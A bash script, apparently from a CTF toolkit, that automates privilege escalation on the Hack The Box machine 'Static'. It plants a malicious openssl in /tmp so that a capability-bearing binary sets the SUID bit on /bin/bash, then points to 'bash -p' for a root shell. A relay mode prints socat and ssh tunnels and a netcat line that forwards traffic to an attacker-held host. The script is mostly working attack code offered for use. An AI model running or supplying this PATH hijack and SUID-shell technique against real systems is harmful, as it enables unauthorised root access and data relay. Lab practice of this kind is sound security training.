#!/usr/bin/env bash
# HTB Static — three privesc paths (format string, PATH hijack) and the relay setup
# Source: static.txt   |   Arsenal refs: §9.6, §10.1
#
# Pairs with the existing poc_htb_static_fmtstr.py (arsenal §10.1). This driver covers
# the local service relay, the PATH hijack, and the verification steps.
#
# Usage (from your shell on the box, as the low-priv user):
#   ./poc_htb_static_privesc.sh --relay            # bridge 127.0.0.1:1234 to your Kali
#   ./poc_htb_static_privesc.sh --path-hijack      # openssl PATH hijack via ersatool
#   ./poc_htb_static_privesc.sh --info             # capabilities + binary survey

set -u
MODE=""

while [ $# -gt 0 ]; do
  case "$1" in
    --relay)       MODE="relay"; shift ;;
    --path-hijack) MODE="path"; shift ;;
    --info)        MODE="info"; shift ;;
    *) echo "unknown arg: $1" >&2; exit 2 ;;
  esac
done

case "$MODE" in
  info)
    echo "=== binaries of interest ==="
    command -v ersatool && ls -l "$(command -v ersatool)"
    echo
    echo "=== file capabilities (this is the escalation vector) ==="
    getcap -r / 2>/dev/null | head -20
    echo
    echo "=== listening local services ==="
    (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | head -20
    echo
    echo "=== hardening ==="
    readelf -h "$(command -v ersatool)" 2>/dev/null | grep -E 'Type|Machine'
    echo
    echo "[i] if 'cap_dac_override,cap_setuid,cap_setgid' is on ersatool, replaced"
    echo "    helpers it calls (openssl, cat, ...) inherit those capabilities."
    ;;

  path)
    echo "[*] planting a malicious openssl on PATH"
    cat > /tmp/openssl <<'EOS'
#!/bin/bash
chmod 4755 /bin/bash
EOS
    chmod +x /tmp/openssl
    export PATH=/tmp:$PATH
    echo "    which openssl -> $(which openssl)"
    if [ "$(which openssl)" != "/tmp/openssl" ]; then
      echo "[-] /tmp is not first on PATH; aborting" >&2; exit 1
    fi

    echo "[*] triggering ersatool create (calls openssl by relative name)"
    ersatool create xD 2>&1 | head -5
    echo

    if [ -u /bin/bash ]; then
      echo "[+] SUID bash planted: $(ls -l /bin/bash)"
      echo "[*] run: /bin/bash -p ; then: cat /root/root.txt"
    else
      echo "[!] /bin/bash is not SUID — the helper did not run with capabilities."
      echo "    Check: getcap $(command -v ersatool)"
      echo "    Fall back to the format string path (poc_htb_static_fmtstr.py)."
    fi
    ;;

  relay)
    echo "[*] relaying the internal service to your Kali"
    echo "    Option A (on the box):   socat TCP-LISTEN:1234,fork TCP:127.0.0.1:1234"
    echo "    Option B (from Kali):    ssh -L 1234:127.0.0.1:1234 user@<TARGET_IP>"
    echo "    Option C (if socat absent, reverse the direction from the box):"
    echo "      bash -c 'cat < /dev/tcp/127.0.0.1/1234 | nc <ATTACKER_IP> 1234'"
    echo
    echo "[i] then, from Kali:  ./poc_htb_static_fmtstr.py --host 127.0.0.1 --port 1234"
    echo "    Requires: pip install pwntools; correct libc.so.6 from the box:"
    echo "      ldd ersatool   (or copy /lib/x86_64-linux-gnu/libc.so.6)"
    ;;

  *)
    echo "usage: $0 --info | --path-hijack | --relay" >&2
    exit 2
    ;;
esac
